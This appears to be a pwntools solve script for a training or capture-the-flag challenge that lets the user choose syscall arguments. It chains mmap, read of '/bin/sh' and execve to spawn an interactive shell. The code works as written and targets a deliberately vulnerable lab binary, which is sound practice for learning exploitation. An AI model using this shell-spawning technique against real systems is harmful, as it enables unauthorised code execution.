from pwn import *

io = process('./challenge')
# $ ./challenge 
io.recvline_contains(b'What do you want for rdi?')
io.sendline(b'4194304')
io.recvline_contains(b'What do you want for rsi?')
io.sendline(b'4096')
io.recvline_contains(b'What do you want for rdx?')
io.sendline(b'7')
io.recvline_contains(b'What do you want for r10?')
io.sendline(b'34')
io.recvline_contains(b'What do you want for r8?')
io.sendline(b'-1')
io.recvline_contains(b'What do you want for r9?')
io.sendline(b'0')
io.recvline_contains(b'What syscall number to call?')
io.sendline(b'9')
io.recvline_contains(b'syscall(9, 400000, 1000, 7, 22, ffffffffffffffff, 0);')
io.recvline_contains(b'Syscall returned 0x400000')
io.recvline_contains(b'Do another (0/1)?')
io.sendline(b'1')
io.recvline_contains(b'What do you want for rdi?')
io.sendline(b'0')
io.recvline_contains(b'What do you want for rsi?')
io.sendline(b'4194304')
io.recvline_contains(b'What do you want for rdx?')
io.sendline(b'7')
io.recvline_contains(b'What do you want for r10?')
io.sendline(b'0')
io.recvline_contains(b'What do you want for r8?')
io.sendline(b'0')
io.recvline_contains(b'What do you want for r9?')
io.sendline(b'0')
io.recvline_contains(b'What syscall number to call?')
io.sendline(b'0')
io.recvline_contains(b'syscall(0, 0, 400000, 7, 0, 0, 0);')
io.sendline(b'/bin/sh1')
io.recvline_contains(b'Syscall returned 0x7')
io.recvline_contains(b'Do another (0/1)?')
io.recvline_contains(b'What do you want for rdi?')
io.sendline(b'4194304')
io.recvline_contains(b'What do you want for rsi?')
io.sendline(b'0')
io.recvline_contains(b'What do you want for rdx?')
io.sendline(b'0')
io.recvline_contains(b'What do you want for r10?')
io.sendline(b'0')
io.recvline_contains(b'What do you want for r8?')
io.sendline(b'0')
io.recvline_contains(b'What do you want for r9?')
io.sendline(b'0')
io.recvline_contains(b'What syscall number to call?')
io.sendline(b'59')
io.recvline_contains(b'syscall(3b, 400000, 0, 0, 0, 0, 0);')
io.sendline(b'whoami')
#io.sendline(b'./submitter 2')
io.interactive()
